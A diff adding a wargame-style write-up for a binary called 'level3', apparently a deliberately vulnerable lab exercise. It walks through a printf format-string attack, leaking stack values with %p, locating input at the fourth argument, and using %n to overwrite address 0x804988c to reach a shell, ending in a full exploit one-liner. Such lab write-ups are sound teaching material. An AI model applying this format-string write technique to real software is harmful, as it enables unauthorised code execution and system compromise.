@@ -9,3 +9,29 @@ will branch into a /bin/sh.
 
 We then deduce we merely need to change the value at address 0x804988c to 0x40
 to exploit this binary. We can do that by using the %n specifier in printf.
+
+%n writes the number of characters written so far in the *int specified in the
+argument. We need to pass the address to the proper position.
+
+We try to output some "A"s to check their position:
+python -c  'print "AAAA" + "%p "*10' | ./level3
+> AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
+
+Here we can see that we have 0x41414141 (A in hex) at the 4th position.
+Let's verify that:
+
+python -c  'print "AAAA" + "%4$p"' | ./level3
+> AAAA0x41414141
+
+It seems correct that the 4th argument is what needs to be changed.
+We can try to replace the "A"s with the address we need to change.
+
+python -c  'print "\x8c\x98\x04\x08" + "%4$p"' | ./level3
+> �0x804988c
+
+Now we can pad that to get the proper number of characters:
+python -c  'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"'
+
+Just add a cat to get control over the shell and we're good.
+
+Exploit: (python -c  'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"';cat) | ./level3
